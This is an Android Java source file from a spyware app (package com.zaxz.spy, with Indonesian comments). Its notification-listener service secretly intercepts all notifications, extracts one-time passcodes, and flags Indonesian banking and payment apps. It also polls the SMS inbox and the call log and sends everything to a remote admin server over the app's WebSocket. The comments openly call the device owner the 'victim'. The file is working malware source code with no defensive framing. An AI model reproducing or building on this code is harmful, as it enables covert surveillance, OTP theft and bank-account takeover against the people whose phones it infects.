package com.zaxz.spy;

import android.app.Notification;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

/**
 * NotificationHandler — intercept notifikasi + SMS + Call logs.
 *
 * PENTING: Service ini TIDAK punya WebSocket sendiri. Semua data dikirim
 * via BackgroundService.instance.sendData(jsonStr). Ini cegah conflict
 * dimana 2 WS connection pakai device_id yang sama → saling timpa di
 * API server's clients Map.
 *
 * Sebelumnya NotificationHandler punya WS sendiri → masalah:
 *  - clients.set(deviceId, ws) di API timpa BackgroundService's WS
 *  - Command dari admin gak nyampe victim (karena NotificationHandler gak handle command)
 *  - Saat NotificationHandler disconnect → clients.delete(deviceId) → BackgroundService juga hilang
 *
 * Fix: NotificationHandler cuma collect data, kirim via BackgroundService.
 */
public class NotificationHandler extends NotificationListenerService {
    private Handler handler;
    private PackageManager packageManager;

    // ============ DEDUPE + PERSISTENT STATE ============
    private SharedPreferences prefs;
    private long lastSmsTime = 0;
    private long lastCallTime = 0;
    private final Set<String> sentSmsKeys = new HashSet<>();
    private final Set<String> sentCallKeys = new HashSet<>();
    private static final int MAX_DEDUPE_ENTRIES = 500;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        packageManager = getPackageManager();

        prefs = getSharedPreferences("spy_notif", Context.MODE_PRIVATE);
        lastSmsTime = prefs.getLong("last_sms_time", 0);
        lastCallTime = prefs.getLong("last_call_time", 0);

        Log.i("NotifHandler", "Started (no own WS, uses BackgroundService)");

        // Polling SMS/Call — pake interval lebih lama supaya gak spam database
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { checkNewSms(); }
        }, 10000);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() { checkNewCalls(); }
        }, 12000);
    }

    private void saveSmsTime(long t) {
        lastSmsTime = t;
        if (prefs != null) prefs.edit().putLong("last_sms_time", t).apply();
    }

    private void saveCallTime(long t) {
        lastCallTime = t;
        if (prefs != null) prefs.edit().putLong("last_call_time", t).apply();
    }

    private String smsKey(String address, long date, String body) {
        int bodyHash = body != null ? body.hashCode() : 0;
        return address + "|" + date + "|" + bodyHash;
    }

    private String callKey(String number, long date) {
        return number + "|" + date;
    }

    private void rememberKey(Set<String> set, String key) {
        if (set.size() > MAX_DEDUPE_ENTRIES) {
            Set<String> trimmed = new HashSet<>();
            int i = 0;
            for (String k : set) {
                if (i >= MAX_DEDUPE_ENTRIES / 2) break;
                trimmed.add(k);
                i++;
            }
            set.clear();
            set.addAll(trimmed);
        }
        set.add(key);
    }

    /**
     * Kirim data ke API via BackgroundService's WebSocket.
     * Gak punya WS sendiri — pakai static instance BackgroundService.
     */
    private void sendData(String jsonStr) {
        if (BackgroundService.instance != null) {
            BackgroundService.instance.sendData(jsonStr);
        }
    }

    // ============ NOTIFICATION INTERCEPTOR ============

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            if (notification == null) return;

            Bundle extras = notification.extras;
            String title = "";
            String content = "";

            if (extras != null) {
                CharSequence titleSeq = extras.getCharSequence(Notification.EXTRA_TITLE);
                CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
                CharSequence bigTextSeq = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

                if (titleSeq != null) title = titleSeq.toString();
                if (bigTextSeq != null) content = bigTextSeq.toString();
                else if (textSeq != null) content = textSeq.toString();
            }

            if (title.isEmpty() && content.isEmpty()) return;

            // Deteksi OTP
            boolean isOtp = false;
            String otpCode = null;
            java.util.regex.Matcher otpMatcher = OTP_PATTERN.matcher(content);
            if (otpMatcher.find()) {
                String lowerContent = content.toLowerCase();
                if (lowerContent.contains("otp") || lowerContent.contains("code") ||
                    lowerContent.contains("verif") || lowerContent.contains("kode") ||
                    lowerContent.contains("verification") || lowerContent.contains("pin")) {
                    isOtp = true;
                    otpCode = otpMatcher.group(1);
                }
            }

            String category = categorizeApp(packageName);

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            String formattedDate = sdf.format(new Date());

            JSONObject notifData = new JSONObject();
            notifData.put("type", "app_notification");
            notifData.put("app", getAppName(packageName));
            notifData.put("package", packageName);
            notifData.put("category", category);
            notifData.put("title", title);
            notifData.put("content", content);
            notifData.put("is_otp", isOtp);
            if (otpCode != null) notifData.put("otp_code", otpCode);
            notifData.put("time", System.currentTimeMillis());
            notifData.put("time_formatted", formattedDate);
            notifData.put("post_time", sbn.getPostTime());

            sendData(notifData.toString());
        } catch (Exception e) {
            // Silent
        }
    }

    private static final java.util.regex.Pattern OTP_PATTERN =
        java.util.regex.Pattern.compile("\\b(\\d{4,8})\\b");

    private String categorizeApp(String packageName) {
        if (packageName == null) return "other";
        String p = packageName.toLowerCase();
        if (p.contains("whatsapp") || p.contains("messaging")) return "messaging";
        if (p.contains("sms") || p.contains("mms") || p.contains("telephony")) return "sms";
        if (p.contains("telegram")) return "messaging";
        if (p.contains("instagram") || p.contains("facebook") || p.contains("twitter") || p.contains("tiktok")) return "social";
        if (p.contains("bank") || p.contains("bca") || p.contains("mandiri") || p.contains("bni") || p.contains("bri") || p.contains("ovo") || p.contains("gopay") || p.contains("dana")) return "banking";
        if (p.contains("gmail") || p.contains("email")) return "email";
        if (p.contains("shop") || p.contains("shopee") || p.contains("tokopedia") || p.contains("lazada")) return "shopping";
        return "other";
    }

    private String getAppName(String packageName) {
        try {
            android.content.pm.ApplicationInfo ai = packageManager.getApplicationInfo(packageName, 0);
            return packageManager.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    // ============ SMS POLLING ============

    private void checkNewSms() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() { checkNewSms(); }
                }, 30000);
                return;
            }

            Uri smsUri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(smsUri, null,
                "date > " + lastSmsTime, null, "date ASC");

            int sentThisRound = 0;
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                        if (address == null) address = "unknown";
                        if (body == null) body = "";

                        String key = smsKey(address, date, body);
                        if (sentSmsKeys.contains(key)) {
                            if (date > lastSmsTime) saveSmsTime(date);
                            continue;
                        }
                        if (date > lastSmsTime) saveSmsTime(date);
                        rememberKey(sentSmsKeys, key);

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject smsData = new JSONObject();
                        smsData.put("type", "notification");
                        smsData.put("app", "SMS");
                        smsData.put("package", "com.android.mms");
                        smsData.put("title", "New SMS from: " + address);
                        smsData.put("content", body);
                        smsData.put("time", date);
                        smsData.put("time_formatted", formattedDate);
                        smsData.put("sms_type", type.equals("1") ? "inbox" : "sent");
                        smsData.put("address", address);

                        sendData(smsData.toString());
                        sentThisRound++;
                    } catch (Exception e) {}
                } while (cursor.moveToNext());
                cursor.close();
            }

            long nextDelay = sentThisRound > 5 ? 30000 : 15000;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, nextDelay);
        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, 30000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, 15000);
        }
    }

    private void checkNewCalls() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() { checkNewCalls(); }
                }, 30000);
                return;
            }

            Uri callsUri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = getContentResolver().query(callsUri, null,
                CallLog.Calls.DATE + " > " + lastCallTime, null, CallLog.Calls.DATE + " ASC");

            int sentThisRound = 0;
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                        if (number == null) number = "unknown";
                        if (name == null) name = "unknown";
                        if (duration == null) duration = "0";

                        String key = callKey(number, date);
                        if (sentCallKeys.contains(key)) {
                            if (date > lastCallTime) saveCallTime(date);
                            continue;
                        }
                        if (date > lastCallTime) saveCallTime(date);
                        rememberKey(sentCallKeys, key);

                        String callType = "";
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE: callType = "incoming"; break;
                            case CallLog.Calls.OUTGOING_TYPE: callType = "outgoing"; break;
                            case CallLog.Calls.MISSED_TYPE: callType = "missed"; break;
                            case CallLog.Calls.REJECTED_TYPE: callType = "rejected"; break;
                            case CallLog.Calls.BLOCKED_TYPE: callType = "blocked"; break;
                            default: callType = "unknown";
                        }

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject callData = new JSONObject();
                        callData.put("type", "notification");
                        callData.put("app", "Phone");
                        callData.put("package", "com.android.dialer");
                        callData.put("title", "New Call: " + callType + " from " + (name.equals("unknown") ? number : name));
                        callData.put("content", "Number: " + number + "\nName: " + name + "\nDuration: " + duration + "s\nType: " + callType);
                        callData.put("time", date);
                        callData.put("time_formatted", formattedDate);
                        callData.put("call_number", number);
                        callData.put("call_name", name);
                        callData.put("call_duration", duration);
                        callData.put("call_type", callType);

                        sendData(callData.toString());
                        sentThisRound++;
                    } catch (Exception e) {}
                } while (cursor.moveToNext());
                cursor.close();
            }

            long nextDelay = sentThisRound > 5 ? 30000 : 15000;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, nextDelay);
        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, 30000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, 15000);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i("NotifHandler", "Listener connected");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.i("NotifHandler", "Listener disconnected");
    }

    @Override
    public void onDestroy() {
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        super.onDestroy();
    }
}
